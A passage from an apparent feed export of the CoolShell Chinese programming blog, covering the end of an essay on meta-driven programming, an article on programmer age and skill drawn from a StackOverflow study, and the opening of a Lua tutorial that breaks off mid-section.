答案是：有！这就是元(Meta)，包括元语言(Meta Language)和元数据(Meta Data)两个方面。元并不神秘，我们通常所说的配置就是元，元语言就是配置的语法和语义，元数据就是具体的配置，它们之间的关系就是C语言和C程序之间的关系；但是，同时元又非常神奇，因为元既是数据也是代码，在表达逻辑和语义方面具有无与伦比的灵活性。至此，我们终于找到了让代码变得简洁、优雅、易理解、易维护的终极方法，这就是： &lt;strong&gt;通过元语言抽象让逻辑和控制彻底解耦&lt;/strong&gt;！

比如，对于二进制消息解析，经典的做法是类似Google的&lt;a href="http://code.google.com/p/protobuf/"&gt;Protocol Buffers&lt;/a&gt;，把消息结构特征抽象出来，定义消息描述元语言，再通过元数据描述消息结构。下面是Protocol Buffers元数据的例子，这个元数据是纯逻辑的表达，它的复杂度体现的是消息结构的本质复杂度，而如何序列化和解析这些控制相关的部分被Protocol Buffers编译器隐藏起来了。
[c]
message Person {
  required int32 id = 1;
  required string name = 2;
  optional string email = 3;
}
</pre>
<p>元语言解决了逻辑表达问题，但是最终要与控制相结合成为具体实现，这就是元语言到目标语言的映射问题。通常有这两种方法：</p>
<p>1) 元编程(Meta Programming)，开发从元语言到目标语言的编译器，将元数据编译为目标程序代码；</p>
<p>2) 元驱动编程(Meta Driven Programming)，直接在目标语言中实现元语言的解释器。</p>
<p>这两种方法各有优势，元编程由于有静态编译阶段，一般产生的目标程序代码性能更好，但是这种方式混合了两个层次的代码，增加了代码配置管理的难度，一般还需要同时配备Build脚本把整个代码生成自动集成到Build过程中，此外，和IDE的集成也是问题；元驱动编程则相反，没有静态编译过程，元语言代码是动态解析的，所以性能上有损失，但是更加灵活，开发和代码配置管理的难度也更小。除非是性能要求非常高的场合，我推荐的是元驱动编程，因为它更轻量，更易于与目标语言结合。</p>
<p>下面是用元驱动编程解决二进制消息解析问题的例子，meta_message_x是元数据，parse_message是解释器：</p>
<p>[javascript]<br>
var meta_message_x = {<br>
id: ‘x’,<br>
fields: [<br>
{ name: ‘message_type’, type: int8, value: 0x01 },<br>
{ name: ‘payload_size’, type: int16 },<br>
{ name: ‘payload’, type: bytes, size: ‘$payload_size’ },<br>
{ name: ‘crc’, type: crc32, source: [‘message_type’, ‘payload_size’, ‘payload’] }<br>
]<br>
}</p>
<p>var message_x = parse_message(meta_message_x, data, size);<br>
[/javascript]</p>
<p>这段代码我用的是JavaScript语法，因为对于支持Literal的类似JSON对象表示的语言中，实现元驱动编程最为简单。如果是Java或C++语言，语法上稍微繁琐一点，不过本质上是一样的，或者引入JSON配置文件，然后解析配置，或者定义MessageConfig类，直接把这个类对象作为配置信息。</p>
<p>二进制文件解析问题是一个经典问题，有Protocol Buffers、Android AIDL等大量的实例，所以很多人能想到引入消息定义元语言，但是如果我们把问题稍微变换，能想到采用这种方法的人就不多了。来看下面这个问题：</p>
<blockquote><p>某网站有新用户注册、用户信息更新，和个性设置等Web表单。出于性能和用户体验的考虑，在用户点击提交表单时，会先进行浏览器端的验证，比如：name字段至少3个字符，password字段至少8个字符，并且和repeat password要一致，email要符合邮箱格式；通过浏览器端验证以后才通过HTTP请求提交到服务器。</p></blockquote>
<p>普通的实现是这个样子的：</p>
<p>[javascript]<br>
function check_form_x() {<br>
var name = $(‘#name’).val();<br>
if (null == name || name.length &lt;= 3) {<br>
return { status : 1, message: ‘Invalid name’ };<br>
}</p>
<p> var password = $(‘#password’).val();<br>
if (null == password || password.length &lt;= 8) {<br>
return { status : 2, message: ‘Invalid password’ };<br>
}</p>
<p> var repeat_password = $(‘#repeat_password’).val();<br>
if (repeat_password != password.length) {<br>
return { status : 3, message: ‘Password and repeat password mismatch’ };<br>
}</p>
<p> var email = $(‘#email’).val();<br>
if (check_email_format(email)) {<br>
return { status : 4, message: ‘Invalid email’ };<br>
}</p>
<p> …</p>
<p> return { status : 0, message: ‘OK’ };</p>
<p>}<br>
[/javascript]</p>
<p>上面的实现就是按照组建复用的思想封装了一下检测email格式之类的通用函数，这和刚才的二进制消息解析非常相似，没法在不同的表单之间进行大规模复用，很多细节都必须被重复编写。下面是用元语言抽象改进后的做法：</p>
<p>[javascript]<br>
var meta_create_user = {<br>
form_id : ‘create_user’,<br>
fields : [<br>
{ id : ‘name’, type : ‘text’, min_length : 3 },<br>
{ id : ‘password’, type : ‘password’, min_length : 8 },<br>
{ id : ‘repeat-password’, type : ‘password’, min_length : 8 },<br>
{ id : ’email’, type : ’email’ }<br>
]<br>
};</p>
<p>var r = check_form(meta_create_user);<br>
[/javascript]</p>
<p>通过定义表单属性元语言，整个逻辑顿时清晰了，细节的处理只需要在check_form中编写一次，完全实现了“简短、优雅、易理解、以维护”的目标。其实，不仅Web表单验证可以通过元语言描述，整个Web页面从布局到功能全部都可以通过一个元对象描述，完全将逻辑和控制解耦。此外，我编写的用于解析命令行参数的<a href="https://github.com/weidagang/line-parser-js">lineparser.js</a>库也是基于元语言的，有兴趣的朋友可以参考并对比它和其他命令行解析库的设计差异。</p>
<p>最后，我们再来从代码长度的角度来分析一下元驱动编程和普通方法之间的差异。假设一个功能在系统中出现了n次，对于普通方法来讲，由于逻辑和控制的耦合，它的代码量是n * (L + C)，而元驱动编程只需要实现一次控制，代码长度是C + n * L，其中L表示逻辑相关的代码量，C表示控制相关的代码量。通常情况下L部分都是一些配置，不容易引入bug，复杂的主要是C的部分，普通方法中C被重复了n次，引入bug的可能性大大增加，同时修改一个bug也可能要改n个地方。所以，对于重复出现的功能，元驱动编程大大减少了代码量，减小了引入bug的可能，并且提高了可维护性。</p>
<h4>
<a href="https://www.cnblogs.com/weidagang2046/p/the-nature-of-meta.html#-4" name="-4"></a>总结</h4>
<p>《人月神话》的作者Fred Brooks曾在80年代阐述了它对于软件复杂性的看法，即著名的<a href="https://en.wikipedia.org/wiki/No_Silver_Bullet">No Silver Bullet</a>。他认为不存在一种技术能使得软件开发在生产力、可靠性、简洁性方面提高一个数量级。我不清楚Brooks这一论断详细的背景，但是就个人的开发经验而言，元驱动编程和普通编程方法相比在生产力、可靠性和简洁性方面的确是数量级的提升,在我看来它就是软件开发的银弹！</p>
<div style="margin-top: 15px; font-size: 11px;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
 ]]></content>
<pubDate>2013-10-31T08:00:09+08:00</pubDate>
<guid>https://coolshell.cn/articles/10652.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 编程能力与编程年龄 ]]></title>
<link>https://coolshell.cn/articles/10688.html</link>
<content><![CDATA[ 
<p>程序员这个职业究竟可以干多少年，在中国这片神奇的土地上，很多人都说只能干到30岁，然后就需要转型，就像《<a title="程序员技术练级攻略 - 354,806 人阅读" href="https://coolshell.cn/articles/4990.html" target="_blank">程序员技术练级攻略</a>》这篇文章很多人回复到这种玩法会玩死人的一样。我在很多面试中，问到应聘者未来的规划都能听到好些应聘都说程序员是个青春饭。因为，大多数程序员都认为，编程这个事只能干到30岁，最多35岁吧。每每我听到这样的言论，都让我感到相当的无语，大家都希望能像《<a title="“21天教你学会C++”" href="https://coolshell.cn/articles/2250.html" target="_blank">21天速成C++</a>》那样速成，好多时候超级有想和他们争论的冲动，但后来想想算了，因为<strong>你无法帮助那些只想呆在井底思维封闭而且想走捷径速成的人</strong>。</p>
<p>今天，我们又来谈这个老话题，因为我看到一篇论文，但是也一定会有很多人都会找出各种理由来论证这篇论文的是错的，无所谓了，我把这篇文章送给那些和我一样准备为技术和编程执着和坚持的人。</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4">
<a class="ez-toc-link ez-toc-heading-1" href="#%E8%AE%BA%E6%96%87" title="论文">论文</a><ul class="ez-toc-list-level-5">
<li class="ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-2" href="#%E5%B9%B4%E9%BE%84%E5%88%86%E5%B8%83%E5%9B%BE" title="年龄分布图">年龄分布图</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-3" href="#%E8%83%BD%E5%8A%9B%E5%92%8C%E5%B9%B4%E9%BE%84%E5%88%86%E5%B8%83%E5%9B%BE" title="能力和年龄分布图">能力和年龄分布图</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-4" href="#%E5%B9%B4%E7%BA%AA%E5%A4%A7%E7%9A%84%E4%BA%BA%E6%98%AF%E5%90%A6%E8%B7%9F%E4%B8%8D%E4%B8%8A%E6%96%B0%E6%8A%80%E6%9C%AF" title="年纪大的人是否跟不上新技术">年纪大的人是否跟不上新技术</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-5" href="#%E7%BB%93%E8%AE%BA" title="结论">结论</a></li>
</ul>
</li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-6" href="#%E6%88%91%E7%9A%84%E4%B8%80%E4%BA%9B%E6%84%9F%E5%8F%97" title="我的一些感受">我的一些感受</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E8%AE%BA%E6%96%87"></span>论文<span class="ez-toc-section-end"></span>
</h4>
<p>首先，我们先来看一篇论文《<a href="http://people.engr.ncsu.edu/ermurph3/papers/msr13.pdf" target="_blank">Is Programming Knowledge Related to Age?</a>》（PDF链接），这篇论文是两个北卡罗莱纳州立大学计算机科学系的两个人Patrick Morrison 和 Emerson Murphy-Hill 对StackOverflow.com上的用户做了相关的数据挖掘得出来的一些数据。（我们知道StackOverflow.com上的数据是公开的，任何人都可以用来分析和统计，所以这篇论文的真实性是有的）</p>
<p>数据采样和清洗条件如下：（数据全量是1694981用户，平均年龄30.3岁）</p>
<ul>
<li>15-70岁之间的用户（这年龄段的用户被称做“Working age”），当然，有很多用户没有输入年龄，这些用户都被过滤了。</li>
<li>用户在2012年内都回答过问题。因为StackOverflow在2012年对问题和答案的质量要求得比以前高了一倍，所以更能反映程序员的真实水平。</li>
<li>Reputation声望在2-100K之间。（注：StackOverflow的用户Reputation是得到社会认可的，在面试和招聘中是硬通货币。比大学的学分更有价值）</li>
</ul>
<p>上述的条件一共过滤出84,248名程序员，平均年龄：29.02岁，平均Reputaion在1073.9分。</p>
<p><span id="more-10688"></span></p>
<h5>
<span class="ez-toc-section" id="%E5%B9%B4%E9%BE%84%E5%88%86%E5%B8%83%E5%9B%BE"></span>年龄分布图<span class="ez-toc-section-end"></span>
</h5>
<p>下面我们来看一下他们的年龄分布图：我们可以看到程序员年纪的正态分布（高点在25岁左右，但是中点在29岁左右）</p>
<p><img alt="image placeholder" ></p>
<h5>
<span class="ez-toc-section" id="%E8%83%BD%E5%8A%9B%E5%92%8C%E5%B9%B4%E9%BE%84%E5%88%86%E5%B8%83%E5%9B%BE"></span>能力和年龄分布图<span class="ez-toc-section-end"></span>
</h5>
<p>然后，计算每个人每个月的Reputation，这样可以找到这个用户的真正的活跃时间，这样便于计算这个程序员的真实能力。（总声望 / 活跃时间），可以得到他平均每个月得来的Reputation。</p>
<p>我们来看看程序员的能力和年龄段的分布图：（你可能会大吃一惊）</p>
<p><img alt="image placeholder" ></p>
<p>上图中我们可以看到，程序员的能力在从25岁左右开始上升，一直到50岁后才会开始下降。所以说，程序员吃的不是青春饭。只有码农，靠蛮力，用体力而不是用脑力的程序员才是吃青春饭的人。</p>
<h5>
<span class="ez-toc-section" id="%E5%B9%B4%E7%BA%AA%E5%A4%A7%E7%9A%84%E4%BA%BA%E6%98%AF%E5%90%A6%E8%B7%9F%E4%B8%8D%E4%B8%8A%E6%96%B0%E6%8A%80%E6%9C%AF"></span>年纪大的人是否跟不上新技术<span class="ez-toc-section-end"></span>
</h5>
<p>论文的作者分析了Tag，用了最近5年内比较流行的技术Tag，然后用了一套比较严谨的算法来查看那些所谓的“老程序员”是否在新技术上跟上不了，所谓跟不上，也就是这些老的程序员在回答这些新技术上并不活跃。所谓老，就是37岁以上的程序员（就是我现在的年纪）。</p>
<p>得到了下表：可以看到，老程序员和年轻的程序员对于一些新技术的学习来说也是差不多的，甚至有些项还超过了年轻的程序员。</p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<h5 style="text-align: left;">
<span class="ez-toc-section" id="%E7%BB%93%E8%AE%BA"></span>结论<span class="ez-toc-section-end"></span>
</h5>
<p>论文的结论是：</p>
<p style="padding-left: 30px;"><strong>1）程序员技术能力上升是可以到50岁或60岁的。</strong></p>
<p style="padding-left: 30px;"><strong>2）老程序员在获取新技术上的能力并不比年轻的程序员差。</strong></p>
<h4 style="text-align: left;">
<span class="ez-toc-section" id="%E6%88%91%E7%9A%84%E4%B8%80%E4%BA%9B%E6%84%9F%E5%8F%97"></span>我的一些感受<span class="ez-toc-section-end"></span>
</h4>
<p style="text-align: left;">最后，我说一说我的一些感受：</p>
<ul>
<li>这些年来的对于外企和国内感受—— <strong>国外牛B的IT公司的工程能力并不见得比国内的要强多少，但是国外那些NB的IT公司的架构和设计能力远远超过国内的公司，最可怕的是，那些有超强架构和设计能力的“老程序员们”还战斗在一线，这些战斗在一线的老鸟的能力绝对超过100个普能的新手。</strong>
</li>
</ul>
<ul>
<li>对年轻程序员的感受——国内新一代的程序员们太浮燥了。<strong>老实说，对于大多数人来说，如果你没有编程到30岁，你还不能成为一个“合格”的程序员</strong>。<span style="color: #cc0000;"><strong>所以，并不是编程编到30岁就玩完了，而是编程编到30岁才刚刚入门。</strong><span style="color: #000000;">这些不合格的程序，整天BS这个不好，那个不好的，而且喜欢速成，好大喜功。</span></span>
</li>
</ul>
<ul>
<li>我是一个奔四的人了，编程就像登山一样，越往上爬人越少，所以，在我这个年纪还有想法，对编程还有热情的人不多了，基本上都是转Manager了。<span style="color: #cc0000;"><strong>其实，什么职位，Title都是虚的，公司没了什么都没了，只有技术才是硬通货。而且，越是这个年纪还在玩编程玩技术的人，其实其经验和能力都是比较强的，都是中坚力量，如果还有其它这个年纪和我一样的人，求交往</strong></span>。</li>
</ul>
<p style="text-align: left;">（全文完）</p>
<p></p>
<div style="margin-top: 15px; font-size: 11px;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
 ]]></content>
<pubDate>2013-11-13T08:21:45+08:00</pubDate>
<guid>https://coolshell.cn/articles/10688.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ Lua简明教程 ]]></title>
<link>https://coolshell.cn/articles/10739.html</link>
<content><![CDATA[ 
<p><img alt="image placeholder" >这几天系统地学习了一下<a href="https://www.lua.org" target="_blank">Lua这个脚本语言</a>，Lua脚本是一个很轻量级的脚本，也是号称性能最高的脚本，用在很多需要性能的地方，比如：游戏脚本，nginx，wireshark的脚本，当你把他的源码下下来编译后，你会发现解释器居然不到200k，这是多么地变态啊（/bin/sh都要1M，MacOS平台），而且能和C语言非常好的互动。我很好奇得浏览了一下Lua解释器的源码，这可能是我看过最干净的C的源码了。</p>
<p>我不想写一篇大而全的语言手册，一方面是因为已经有了（见本文后面的链接），重要的原因是，因为大篇幅的文章会挫败人的学习热情，我始终觉得好的文章读起来就像拉大便一样，能一口气很流畅地搞完，才会让人爽（这也是我为什么不想写书的原因）。所以，这必然又是一篇“入厕文章”，还是那句话，我希望本文能够让大家利用上下班，上厕所大便的时间学习一个技术。呵呵。</p>
<p>相信你现在已经在厕所里脱掉裤子露出屁股已经准备好大便了，那就让我们畅快地排泄吧……</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#%E8%BF%90%E8%A1%8C" title="运行">运行</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4">
<a class="ez-toc-link ez-toc-heading-2" href="#%E8%AF%AD%E6%B3%95" title="语法">语法</a><ul class="ez-toc-list-level-5">
<li class="ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-3" href="#%E6%B3%A8%E9%87%8A" title="注释">注释</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-4" href="#%E5%8F%98%E9%87%8F" title="变量">变量</a></li>
</ul>
</li>
<li class="ez-toc-page-1 ez-toc-heading-level-4">
<a class="ez-toc-link ez-toc-heading-5" href="#%E6%8E%A7%E5%88%B6%E8%AF%AD%E5%8F%A5" title="控制语句">控制语句</a><ul class="ez-toc-list-level-5">
<li class="ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-6" href="#while%E5%BE%AA%E7%8E%AF" title="while循环">while循环</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-7" href="#if-else%E5%88%86%E6%94%AF" title="if-else分支">if-else分支</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-8" href="#for_%E5%BE%AA%E7%8E%AF" title="for 循环">for 循环</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-9" href="#until%E5%BE%AA%E7%8E%AF" title="until循环">until循环</a></li>
</ul>
</li>
<li class="ez-toc-page-1 ez-toc-heading-level-4">
<a class="ez-toc-link ez-toc-heading-10" href="#%E5%87%BD%E6%95%B0" title="函数">函数</a><ul class="ez-toc-list-level-5">
<li class="ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-11" href="#%E9%80%92%E5%BD%92" title="递归">递归</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-12" href="#%E9%97%AD%E5%8C%85" title="闭包">闭包</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-13" href="#%E5%87%BD%E6%95%B0%E7%9A%84%E8%BF%94%E5%9B%9E%E5%80%BC" title="函数的返回值">函数的返回值</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-14" href="#%E5%B1%80%E9%83%A8%E5%87%BD%E6%95%B0" title="局部函数">局部函数</a></li>
</ul>
</li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-15" href="#Table" title="Table">Table</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-16" href="#MetaTable_%E5%92%8C_MetaMethod" title="MetaTable 和 MetaMethod">MetaTable 和 MetaMethod</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-17" href="#%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1" title="“面向对象”">“面向对象”</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-18" href="#%E6%A8%A1%E5%9D%97" title="模块">模块</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-19" href="#%E5%8F%82%E8%80%83" title="参考">参考</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E8%BF%90%E8%A1%8C"></span>运行<span class="ez-toc-section-end"></span>
</h4>
<p>首先，我们需要知道，Lua是类C的，所以，他是大小写字符敏感的。</p>
<p>下面是Lua的Hello World。注意：Lua脚本的语句的分号是可选的，这个和<a title="Go 语言简介（上）— 语法" href="https://coolshell.cn/articles/8460.html" target="_blank">GO语言很类似</a>。</p>
<p><code data-enlighter-language="c" class="EnlighterJSRAW">print("Hello World")</code></p>
<p>你可以像python一样，在命令行上运行lua命令后进入lua的shell中执行语句。</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">chenhao-air:lua chenhao$ lua
Lua 5.2.2  Copyright (C) 1994-2013 Lua.org, PUC-Rio
&gt; print("Hello, World")
Hello, World
&gt; </pre>
<p><span id="more-10739"></span></p>
<p>也可以把脚本存成一个文件，用如下命令行来运行。</p>
<p><code data-enlighter-language="shell" class="EnlighterJSRAW">&gt;lua file.lua</code></p>
<p>或是像shell一样运行：</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">chenhao-air:lua chenhao$ cat hello.lua
#!/usr/local/bin/lua
print("Hello, World")
chenhao-air:lua chenhao$ chmod +x hello.lua
chenhao-air:test chenhao$ ./hello.lua
Hello, World</pre>
<h4>
<span class="ez-toc-section" id="%E8%AF%AD%E6%B3%95"></span>语法<span class="ez-toc-section-end"></span>
</h4>
<h5>
<span class="ez-toc-section" id="%E6%B3%A8%E9%87%8A"></span>注释<span class="ez-toc-section-end"></span>
</h5>
<p><code data-enlighter-language="c" class="EnlighterJSRAW">-- 两个减号是行注释</code></p>
<p> </p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">--[[
 这是块注释
 这是块注释
 --]]</pre>
<h5>
<span class="ez-toc-section" id="%E5%8F%98%E9%87%8F"></span>变量<span class="ez-toc-section-end"></span>
</h5>
<p>Lua的数字只有double型，64bits，你不必担心Lua处理浮点数会慢（除非大于100,000,000,000,000），或是会有精度问题。</p>
<p>你可以以如下的方式表示数字，0x开头的16进制和C是很像的。</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">num = 1024
num = 3.0
num = 3.1416
num = 314.16e-2
num = 0.31416E1
num = 0xff
num = 0x56
</pre>
<p>字符串你可以用单引号，也可以用双引号，还支持C类型的转义，比如： ‘\a’ （响铃）， ‘\b’ （退格）， ‘\f’ （表单）， ‘\n’ （换行）， ‘\r’ （回车）， ‘\t’ （横向制表）， ‘\v’ （纵向制表）， ‘\\’ （反斜杠）， ‘\”‘ （双引号）， 以及 ‘\” （单引号)</p>
<p>下面的四种方式定义了完全相同的字符串（其中的两个中括号可以用于定义有换行的字符串）</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">a = 'alo\n123"'
a = "alo\n123\""
a = '\97lo\10\04923"'
a = [[alo
123"]]</pre>
<p>C语言中的NULL在Lua中是nil，比如你访问一个没有声明过的变量，就是nil，比如下面的v的值就是nil</p>
<p><code data-enlighter-language="c" class="EnlighterJSRAW">v = UndefinedVariable</code></p>
<p>布尔类型只有nil和false是 false，数字0啊，‘’空字符串（’\0’）都是true！</p>
<p>另外，需要注意的是：lua中的变量如果没有特殊说明，全是全局变量，那怕是语句块或是函数里。变量前加local关键字的是局部变量。</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">theGlobalVar = 50
local theLocalVar = "local variable"</pre>
<h4>
<span class="ez-toc-section" id="%E6%8E%A7%E5%88%B6%E8%AF%AD%E5%8F%A5"></span>控制语句<span class="ez-toc-section-end"></span>
</h4>
<p>不多说了，直接看代码吧（注意：Lua没有++或是+=这样的操作）</p>
<h5>
<span class="ez-toc-section" id="while%E5%BE%AA%E7%8E%AF"></span>while循环<span class="ez-toc-section-end"></span>
</h5>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">sum = 0
num = 1
while num &lt;= 100 do
    sum = sum + num
    num = num + 1
end
print("sum =",sum)</pre>
<h5>
<span class="ez-toc-section" id="if-else%E5%88%86%E6%94%AF"></span>if-else分支<span class="ez-toc-section-end"></span>
</h5>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">if age == 40 and sex =="Male" then
    print("男人四十一枝花")
elseif age &gt; 60 and sex ~="Female" then
    print("old man without country!")
elseif age &lt; 20 then
    io.write("too young, too naive!\n")
else
    local age = io.read()
    print("Your age is "..age)
end</pre>
<p>上面的语句不但展示了if-else语句，也展示了<br>
1）“～=”是不等于，而不是!=<br>
2）io库的分别从stdin和stdout读写的read和write函数<br>
3）字符串的拼接操作符“..”</p>
<p>另外，条件表达式中的与或非为分是：and, or, not关键字。</p>
<h5>
<span class="ez-toc-section" id="for_%E5%BE%AA%E7%8E%AF"></span>for 循环<span class="ez-toc-section-end"></span>
</h5>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">sum = 0
for i = 1, 100 do
    sum = sum + i
end</pre>
<p> </p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">sum = 0
for i = 1, 100, 2 do
    sum = sum + i
end</pre>
<p> </p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">sum = 0
for i = 100, 1, -2 do
    sum = sum + i
end</pre>
<h5>
<span class="ez-toc-section" id="until%E5%BE%AA%E7%8E%AF"></span>until循环<span class="ez-toc-section-end"></span>
</h5>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">sum = 2
repeat
   sum = sum ^ 2 --幂操作
   print(sum)
until sum &gt;1000</pre>
<h4>
<span class="ez-toc-section" id="%E5%87%BD%E6%95%B0"></span>函数<span class="ez-toc-section-end"></span>
</h4>
<p>Lua的函数和Javascript的很像</p>
<h5>
<span class="ez-toc-section" id="%E9%80%92%E5%BD%92"></span>递归<span class="ez-toc-section-end"></span>
</h5>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">function fib(n)
  if n &lt; 2 then return 1 end
  return fib(n - 2) + fib(n - 1)
end</pre>
<h5>
<span class="ez-toc-section" id="%E9%97%AD%E5%8C%85"></span>闭包<span class="ez-toc-section-end"></span>
</h5>
<p>同样，Javascript附体！</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">function newCounter()
    local i = 0
    return function()     -- anonymous function
       i = i + 1
        return i
    end
end

c1 = newCounter()
print(c1())  --&gt; 1
print(c1())  --&gt; 2</pre>
<p> </p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">function myPower(x)
    return function(y) return y^x end
end

power2 = myPower(2)
power3 = myPower(3)

print(power2(4)) --4的2次方
print(power3(5)) --5的3次方</pre>
<h5>
<span class="ez-toc-section" id="%E5%87%BD%E6%95%B0%E7%9A%84%E8%BF%94%E5%9B%9E%E5%80%BC"></span>函数的返回值<span class="ez-toc-section-end"></span>
</h5>
<p>和<a title="Go 语言简介（上）— 语法" href="https://coolshell.cn/articles/8460.html" target="_blank">Go语言一样</a>，可以一条语句上赋多个值，如：</p>
<p><code data-enlighter-language="c" class="EnlighterJSRAW">name, age, bGay = "haoel", 37, false, "<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="d3bbb2bcb6bf93bbbca7beb2babffdb0bcbe">[email protected]</a>"</code></p>
<p>上面的代码中，因为只有3个变量，所以第四个值被丢弃。</p>
<p>函数也可以返回多个值：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">function getUserInfo(id)
    print(id)
    return "haoel", 37, "<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="224a434d474e624a4d564f434b4e0c414d4f">[email protected]</a>", "https://coolshell.cn"
end

name, age, email, website, bGay = getUserInfo()
</pre>
<p>注意：上面的示例中，因为没有传id，所以函数中的id输出为nil，因为没有返回bGay，所以bGay也是nil。</p>
<h5>
<span class="ez-toc-section" id="%E5%B1%80%E9%83%A8%E5%87%BD%E6%95%B0"></span>局部函数<span class="ez-toc-section-end"></span>
</h5>
<p>函数前面加上local就是局部函数，其实，Lua中的函数和Javascript中的一个德行。</p>
<p>比如：下面的两个函数是一样的：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">function foo(x) return x^2 end
foo = function(x) return x^2 end</pre>
<h4>
<span class="ez-toc-section" id="Table"></span>Table<span class="ez-toc-section-end"></span>
</h4>
<p>所谓Table其实就是一个Key Value的数据结构，它很像Javascript中的Object，或是PHP中的数组，在别的语言里叫Dict或Map，Table长成这个样子：</p>
<p><code data-enlighter-language="c" class="EnlighterJSRAW">haoel = {name="ChenHao", age=37, handsome=True}</code></p>
<p>下面是table的CRUD操作：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">haoel.website="https://coolshell.cn/"
local age = haoel.age
haoel.handsome = false
haoel.name=nil</pre>
<p>上面看上去像C/C++中的结构体，但是name,age, handsome, website都是key。你还可以像下面这样写义Table：</p>
<p><code data-enlighter-language="c" class="EnlighterJSRAW">t = {[20]=100, ['name']="ChenHao", [3.14]="PI"} </code></p>
<p>这样就更像Key Value了。于是你可以这样访问：t[20]，t[“name”], t[3.14]。</p>
<p>我们再来看看数组：</p>
<p><code data-enlighter-language="c" class="EnlighterJSRAW">arr = {10,20,30,40,50}</code></p>
<p>这样看上去就像数组了。但其实其等价于：</p>
<p><code data-enlighter-language="c" class="EnlighterJSRAW">arr = {[1]=10, [2]=20, [3]=30, [4]=40, [5]=50}</code></p>
<p>所以，你也可以定义成不同的类型的数组，比如：</p>
<p><code data-enlighter-language="c" class="EnlighterJSRAW">arr = {"string", 100, "haoel", function() print("coolshell.cn") end}</code></p>
<p>注：其中的函数可以这样调用：arr[4]()。</p>
<p>我们可以看到Lua的下标不是从0开始的，是从1开始的。</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">for i=1, #arr do
    print(arr[i])
end</pre>
<p>注：上面的程序中：#arr的意思就是arr的长度。</p>
<p>注：前面说过，Lua中的变量，如果没有local关键字，全都是全局变量，Lua也是用Table来管理全局变量的，Lua把这些全局变量放在了一个叫“_G”的Table里。</p>
<p>我们可以用如下的方式来访问一个全局变量（假设我们这个全局变量名叫globalVar）：</p>
<p></p>
